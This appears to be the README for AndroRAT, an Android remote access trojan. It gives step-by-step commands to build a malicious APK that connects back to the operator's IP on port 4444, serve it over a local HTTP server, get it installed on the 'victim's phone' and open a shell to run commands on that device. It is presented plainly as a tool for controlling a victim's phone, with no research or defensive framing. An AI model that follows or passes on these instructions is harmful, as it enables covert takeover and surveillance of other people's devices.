# AndroRAT
-----------------------------------------------------------------------
First of all extract all files in your computer. 
All the files will be extracted as one single folder.
-----------------------------------------------------------------------
These following commands are only applicable in python version >=3.9
-----------------------------------------------------------------------
1. Open terminal in the same directory and run the following command.
   "**py androRAT.py --build -i 192.168.1.10 -p 4444 -o name_of_app.apk**". 
   (Here, replace the ip "192.168.1.10" with your computer's local ip, also replaces
   the "name_of_app.apk" with your desired name of the app).
    
2. Now run the command "**py -m http.server 8000**".
    (It will start a server on your computer at port 8000).

3. Open browser of victim's phone and go to the address "**192.168.110:8000**".
    (Again  replace the ip "192.168.1.10" with your computer **local ip**).

4. Now download the apk file that you had created with your desired name and install. 
    (Keep running the app in the background.)

5. Now open another terminal in the same directory and run the following command.
    "**py androRAT.py --shell -i 192.168.1.10 -p 4444**".
     (Don't forget to replace the ip)

6. Done! now you will be connected with the victim's phone.
   Simply run command "help" to explore the operations that you can perform in victim's phone.
-----------------------------------------------------------------------
*Note*
-----------------------------------------------------------------------
1.  Do remember, in above commands use your own local ip, you just have to replace it with mine.
2. You can use any port that you want, but better to use **4444**.
3. Also, check the requirements.txt file to install some python modules.
   (To install type: **pip install _name of the module_**)
-----------------------------------------------------------------------
If you have any problem then contact me:
Email ID: **codingdrift18@gmail.com**
